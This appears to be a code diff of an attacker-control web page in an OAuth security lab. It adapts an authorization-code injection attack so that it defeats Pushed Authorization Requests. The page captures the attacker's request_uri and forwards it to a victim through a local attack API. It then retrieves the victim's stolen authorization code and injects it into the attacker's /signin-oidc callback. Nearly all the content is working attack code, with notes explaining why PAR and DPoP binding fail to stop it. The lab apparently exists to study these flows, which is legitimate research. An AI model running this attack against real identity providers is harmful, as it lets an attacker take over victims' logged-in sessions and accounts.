@@ -13,15 +13,21 @@
         <div class="card-body">
             <h5 class="card-title">Attacker Controls</h5>
             <div class="alert alert-info">
-                <strong>Attack Steps:</strong>
+                <strong>Attack Steps (with PAR):</strong>
                 <ol>
                     <li>Click "Initialize Attack"</li>
                     <li>Click "Start OAuth Flow" - this will redirect you to the authorize endpoint</li>
-                    <li>Copy <code>dpop_jkt</code>, <code>state</code>, and <code>code_challenge</code> from the authorize URL</li>
-                    <li>Paste them below and submit (this sends them to the victim)</li>
-                    <li>Wait for victim to authenticate on /Home/Secure</li>
-                    <li>Click "Complete Login with Stolen Code" to inject the stolen code into your OAuth callback</li>
+                    <li>⚠️ <strong>Copy the <code>request_uri</code> from the authorize URL</strong> (e.g., <code>urn:ietf:params:oauth:request_uri:...</code>)</li>
+                    <li>Paste it below and submit (this sends it to the victim)</li>
+                    <li>Wait for victim to authenticate on /Home/Secure (victim's browser will use your request_uri)</li>
+                    <li>Click "Complete Login with Stolen Code" to complete the attack</li>
                 </ol>
+                <div class="alert alert-secondary mt-2">
+                    <strong>Note:</strong> The <code>state</code> parameter is generated server-side and stored in your correlation cookie. When the victim's browser uses your <code>request_uri</code>, the Authorization Server will generate a new state for that session, which will be returned with the authorization code.
+                </div>
+                <div class="alert alert-warning mt-2">
+                    <strong>Why PAR doesn't prevent this attack:</strong> The <code>request_uri</code> is visible in the front-channel and can be reused by the victim's browser. The parameters inside (dpop_jkt, code_challenge, nonce) are bound to the attacker's keys!
+                </div>
             </div>
             <div id="controls">
                 <button class="btn btn-danger" onclick="initAttacker()">Initialize Attack</button>
@@ -36,29 +42,17 @@
 
     <div class="card mb-3">
         <div class="card-body">
-            <h5 class="card-title">Manual Parameter Entry</h5>
-            <p class="text-muted">After starting the OAuth flow, copy these parameters from the authorize URL:</p>
+            <h5 class="card-title">Capture request_uri (PAR)</h5>
+            <p class="text-muted">After starting the OAuth flow, copy the <code>request_uri</code> from the authorize URL:</p>
             <div class="mb-3">
-                <label for="dpop-jkt-input" class="form-label"><strong>DPoP JKT:</strong></label>
-                <input type="text" class="form-control" id="dpop-jkt-input" placeholder="e.g., NzbLsXh8uDCcd-6MNwXF4W_7noWXFZAfHkxZsRGC9Xs">
-                <small class="form-text text-muted">Look for <code>dpop_jkt=...</code> in the browser address bar</small>
+                <label for="request-uri-input" class="form-label"><strong>request_uri:</strong></label>
+                <input type="text" class="form-control" id="request-uri-input" placeholder="e.g., urn:ietf:params:oauth:request_uri:6esc_11ACC5bwc014ltc14eY22c">
+                <small class="form-text text-muted">Look for <code>request_uri=...</code> in the browser address bar</small>
             </div>
-            <div class="mb-3">
-                <label for="state-input" class="form-label"><strong>State:</strong></label>
-                <input type="text" class="form-control" id="state-input" placeholder="e.g., CfDJ8...">
-                <small class="form-text text-muted">Look for <code>state=...</code> in the same URL</small>
+            <div class="alert alert-info">
+                <strong>Note:</strong> The <code>state</code> parameter is automatically generated server-side and stored in your correlation cookie. You don't need to capture it separately.
             </div>
-            <div class="mb-3">
-                <label for="code-challenge-input" class="form-label"><strong>Code Challenge:</strong></label>
-                <input type="text" class="form-control" id="code-challenge-input" placeholder="e.g., abc123...">
-                <small class="form-text text-muted">Look for <code>code_challenge=...</code> in the same URL</small>
-            </div>
-            <div class="mb-3">
-                <label for="nonce-input" class="form-label"><strong>Nonce:</strong></label>
-                <input type="text" class="form-control" id="nonce-input" placeholder="e.g., 638...">
-                <small class="form-text text-muted">Look for <code>nonce=...</code> in the same URL</small>
-            </div>
-            <button class="btn btn-warning" onclick="submitDpopJkt()" disabled id="submit-jkt-btn">Submit Parameters</button>
+            <button class="btn btn-warning" onclick="submitRequestUri()" disabled id="submit-jkt-btn">Submit request_uri</button>
         </div>
     </div>
 
@@ -103,91 +97,53 @@
             return;
         }
         
-        updateStatus('Starting OAuth flow... You will be redirected to the authorize endpoint. Copy the dpop_jkt, state, code_challenge, and nonce from the URL.');
+        updateStatus('Starting OAuth flow... You will be redirected to the authorize endpoint.\n\n⚠️ Copy the request_uri parameter from the URL (e.g., request_uri=urn:ietf:params:oauth:request_uri:...)');
         
         // Trigger the actual OAuth flow through the backend
         // This will cause the backend to generate code_verifier and store it in session
         window.location.href = '/Home/Secure';
     }
     
-    async function submitDpopJkt() {
+    async function submitRequestUri() {
         if (!attackInstance) {
             alert('Please initialize attack first');
             return;
         }
 
-        const dpopJkt = document.getElementById('dpop-jkt-input').value.trim();
-        const state = document.getElementById('state-input').value.trim();
-        const codeChallenge = document.getElementById('code-challenge-input').value.trim();
-        const nonce = document.getElementById('nonce-input').value.trim();
+        const requestUri = document.getElementById('request-uri-input').value.trim();
         
-        if (!dpopJkt) {
-            alert('Please enter a DPoP JKT value');
+        if (!requestUri) {
+            alert('Please enter a request_uri value');
             return;
         }
 
-        if (!state) {
-            alert('Please enter the state parameter value');
-            return;
-        }
-
-        if (!codeChallenge) {
-            alert('Please enter the code_challenge parameter value');
-            return;
-        }
-
-        if (!nonce) {
-            alert('Please enter the nonce parameter value');
-            return;
-        }
-
-        updateStatus(`Submitting parameters:\ndpop_jkt: ${dpopJkt}\nstate: ${state.substring(0, 20)}...\ncode_challenge: ${codeChallenge.substring(0, 20)}...\nnonce: ${nonce.substring(0, 20)}...`);
+        updateStatus(`Submitting request_uri:\nrequest_uri: ${requestUri}`);
 
         try {
-            const response = await fetch(`https://localhost:7666/api/attack/dpop`, {
+            const response = await fetch(`https://localhost:7666/api/attack/par`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     sessionId: attackInstance.sessionId,
-                    dpopProof: dpopJkt,
-                    dpopHeader: dpopJkt,
-                    url: 'https://localhost:5001/connect/authorize',
-                    method: 'GET',
-                    nonce: nonce,
-                    codeChallenge: codeChallenge
+                    requestUri: requestUri
                 })
             });
 
             if (response.ok) {
-                // Store the state and nonce in sessionStorage for later use
-                sessionStorage.setItem('attacker_state', state);
-                sessionStorage.setItem('attacker_nonce', nonce);
-                
-                updateStatus('✓ Successfully submitted all parameters!');
-                document.getElementById('dpop-jkt-input').style.borderColor = '#28a745';
-                document.getElementById('state-input').style.borderColor = '#28a745';
-                document.getElementById('code-challenge-input').style.borderColor = '#28a745';
-                document.getElementById('nonce-input').style.borderColor = '#28a745';
+                updateStatus('✓ Successfully submitted request_uri!\n\nThe victim can now use this request_uri to authorize with YOUR parameters (dpop_jkt, code_challenge, nonce).');
+                document.getElementById('request-uri-input').style.borderColor = '#28a745';
             } else {
-                updateStatus('✗ Failed to submit parameters: ' + response.statusText);
+                updateStatus('✗ Failed to submit request_uri: ' + response.statusText);
             }
         } catch (error) {
-            console.error('Failed to submit parameters:', error);
-            updateStatus('✗ Error submitting parameters: ' + error.message);
+            console.error('Failed to submit request_uri:', error);
+            updateStatus('✗ Error submitting request_uri: ' + error.message);
         }
     }
 
     async function injectStolenCode() {
         if (!attackInstance) {
             alert('Please initialize attack first');
-            return;
-        }
-
-        // Get the stored state
-        const storedState = sessionStorage.getItem('attacker_state');
-        
-        if (!storedState) {
-            alert('Please submit the parameters first!');
             return;
         }
 
@@ -206,9 +162,10 @@
             const codeData = await response.json();
             updateStatus(`✅ Got stolen code: ${codeData.code.substring(0, 20)}...\n\nRedirecting to OAuth callback with stolen code...`);
             
-            // Redirect to the OAuth callback endpoint with the stolen code and attacker's state
-            // The backend will retrieve the code_verifier from the attacker's session and complete the exchange
-            const callbackUrl = `/signin-oidc?code=${encodeURIComponent(codeData.code)}&state=${encodeURIComponent(storedState)}`;
+            // Redirect to the OAuth callback endpoint with the stolen code and state
+            // The state comes from the Authorization Server response (stored with the code)
+            // The backend will retrieve the code_verifier from the attacker's correlation cookie and complete the exchange
+            const callbackUrl = `/signin-oidc?code=${encodeURIComponent(codeData.code)}&state=${encodeURIComponent(codeData.state)}`;
             window.location.href = callbackUrl;
             
         } catch (error) {
